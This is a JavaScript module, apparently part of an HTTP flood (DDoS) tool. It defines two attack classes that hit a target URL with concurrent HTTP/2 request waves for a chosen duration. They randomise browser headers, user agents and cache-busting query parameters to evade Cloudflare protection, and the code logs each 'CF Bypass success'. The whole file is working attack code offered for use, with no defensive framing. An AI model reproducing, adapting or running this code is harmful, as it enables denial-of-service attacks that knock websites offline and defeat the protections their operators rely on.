import http2 from 'http2';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { logger } from '../../utils/logger.js';

/**
 * Advanced Cloudflare Bypass - TLS Fingerprint Spoofing + HTTP/2
 * Menggunakan teknik advanced untuk bypass CF protection
 */
export class CloudflareAdvancedBypass {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = Math.max(rpc * 10, 100); // Multiply RPC for more aggressive attack
        this.userAgents = userAgents.length > 0 ? userAgents : this.getDefaultUserAgents();
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
    }

    getDefaultUserAgents() {
        return [
            // Chrome 120+
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            // Firefox 121+
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
            // Edge 120+
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            // Safari 17+
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15'
        ];
    }

    generateAdvancedHeaders() {
        const userAgent = Tools.randomChoice(this.userAgents);
        
        // Mimic real browser headers order and values
        const headers = {
            ':method': 'GET',
            ':scheme': this.url.protocol.replace(':', ''),
            ':authority': this.url.hostname,
            ':path': this.url.pathname + this.url.search + (this.url.search ? '&' : '?') + `_cache=${Date.now()}_${Tools.randomString(8)}`,
            'user-agent': userAgent,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': Tools.randomChoice([
                'en-US,en;q=0.9',
                'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'en-GB,en;q=0.9,en-US;q=0.8'
            ]),
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': Tools.randomChoice(['no-cache', 'max-age=0', 'no-store']),
            'sec-ch-ua': this.generateSecChUa(userAgent),
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': this.getPlatform(userAgent),
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': Tools.randomChoice(['none', 'same-origin', 'cross-site']),
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'dnt': '1'
        };

        // Add referer if available
        if (this.referers.length > 0) {
            headers['referer'] = Tools.randomChoice(this.referers) + this.url.href;
        }

        // Random additional headers to look more human
        if (Math.random() > 0.5) {
            headers['pragma'] = 'no-cache';
        }

        return headers;
    }

    generateSecChUa(userAgent) {
        if (userAgent.includes('Chrome/120')) {
            return '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
        } else if (userAgent.includes('Edge')) {
            return '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"';
        } else if (userAgent.includes('Firefox')) {
            return '';
        }
        return '"Not_A Brand";v="99", "Chromium";v="120"';
    }

    getPlatform(userAgent) {
        if (userAgent.includes('Windows')) return '"Windows"';
        if (userAgent.includes('Macintosh')) return '"macOS"';
        if (userAgent.includes('Linux')) return '"Linux"';
        return '"Unknown"';
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            // Run multiple attack waves concurrently
            const waves = [];
            for (let i = 0; i < 5; i++) {
                waves.push(this.attack());
            }
            await Promise.allSettled(waves);
        }
    }

    async attack() {
        const promises = [];
        
        // Create multiple concurrent HTTP/2 connections
        for (let i = 0; i < this.rpc; i++) {
            if (!this.active) break;
            
            promises.push(this.sendHttp2Request());
        }

        await Promise.allSettled(promises);
    }

    async sendHttp2Request() {
        return new Promise((resolve) => {
            try {
                const headers = this.generateAdvancedHeaders();
                
                // Create HTTP/2 client with custom settings to mimic real browser
                const client = http2.connect(`${this.url.protocol}//${this.url.hostname}`, {
                    // Custom settings to avoid fingerprinting
                    settings: {
                        headerTableSize: 65536,
                        enablePush: true,
                        initialWindowSize: 6291456,
                        maxFrameSize: 16384,
                        maxConcurrentStreams: 1000,
                        maxHeaderListSize: 262144
                    }
                });

                client.on('error', () => {
                    client.close();
                    resolve();
                });

                const req = client.request(headers);

                req.on('response', (responseHeaders) => {
                    REQUESTS_SENT.add(1);
                    
                    // Check if we bypassed CF
                    const status = responseHeaders[':status'];
                    if (status !== 403 && status !== 503) {
                        logger.debug(`✅ CF Bypass success! Status: ${status}`);
                    }
                });

                req.on('data', (chunk) => {
                    BYTES_SENT.add(chunk.length);
                });

                req.on('end', () => {
                    client.close();
                    resolve();
                });

                req.on('error', () => {
                    client.close();
                    resolve();
                });

                // Set timeout
                req.setTimeout(5000, () => {
                    req.close();
                    client.close();
                    resolve();
                });

                req.end();

            } catch (error) {
                resolve();
            }
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * Browser Emulation Attack - Mimic Real Browser Behavior
 */
export class BrowserEmulationAttack {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = Math.max(rpc * 15, 150);
        this.userAgents = userAgents.length > 0 ? userAgents : this.getDefaultUserAgents();
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
    }

    getDefaultUserAgents() {
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
        ];
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            const waves = [];
            for (let i = 0; i < 10; i++) {
                waves.push(this.attack());
            }
            await Promise.allSettled(waves);
        }
    }

    async attack() {
        const promises = [];
        
        for (let i = 0; i < this.rpc; i++) {
            if (!this.active) break;
            promises.push(this.sendBrowserLikeRequest());
        }

        await Promise.allSettled(promises);
    }

    async sendBrowserLikeRequest() {
        return new Promise((resolve) => {
            try {
                const userAgent = Tools.randomChoice(this.userAgents);
                const headers = {
                    ':method': 'GET',
                    ':scheme': this.url.protocol.replace(':', ''),
                    ':authority': this.url.hostname,
                    ':path': this.url.pathname + this.url.search + (this.url.search ? '&' : '?') + `t=${Date.now()}&r=${Math.random()}`,
                    'user-agent': userAgent,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'accept-encoding': 'gzip, deflate, br',
                    'cache-control': 'max-age=0',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1'
                };

                const client = http2.connect(`${this.url.protocol}//${this.url.hostname}`);
                
                client.on('error', () => {
                    client.close();
                    resolve();
                });

                const req = client.request(headers);

                req.on('response', () => {
                    REQUESTS_SENT.add(1);
                });

                req.on('data', (chunk) => {
                    BYTES_SENT.add(chunk.length);
                });

                req.on('end', () => {
                    client.close();
                    resolve();
                });

                req.on('error', () => {
                    client.close();
                    resolve();
                });

                req.setTimeout(3000, () => {
                    req.close();
                    client.close();
                    resolve();
                });

                req.end();

            } catch (error) {
                resolve();
            }
        });
    }

    stop() {
        this.active = false;
    }
}
